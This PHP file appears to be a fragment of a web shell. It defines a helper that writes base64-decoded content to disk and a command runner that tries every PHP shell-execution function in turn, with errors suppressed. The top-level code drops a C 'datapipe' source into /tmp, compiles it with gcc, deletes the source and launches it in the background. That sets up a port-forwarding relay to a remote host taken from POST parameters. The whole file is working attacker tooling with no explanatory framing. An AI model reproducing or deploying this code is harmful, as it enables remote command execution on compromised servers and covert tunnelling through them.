<?php
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or @function_exists('file_put_contents') or err(0);
 if($w_file)
 {
 @fwrite($w_file,@base64_decode($text)) or @fputs($w_file,@base64_decode($text)) or @file_put_contents($fname,@base64_decode($text));
 @fclose($w_file);
 }
}

function ex($cfe)
{
  $res = '';
 
  if(@function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(@function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(@function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fread($f,1024); }
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fgets($f,1024); }
   }
   @pclose($f);
  }
  elseif(@is_resource($f = @proc_open($cfe,array(1 => array("pipe", "w")),$pipes)))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fread($pipes[1], 1024);}
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fgets($pipes[1], 1024);}
   }
   @proc_close($f);
  }
  
 return $res;
}


cf("/tmp/dpc.c",$datapipe_c);
$blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
@unlink("/tmp/dpc.c");
$blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
$_POST['cmd']="ps -aux | grep dpc";
 
?>

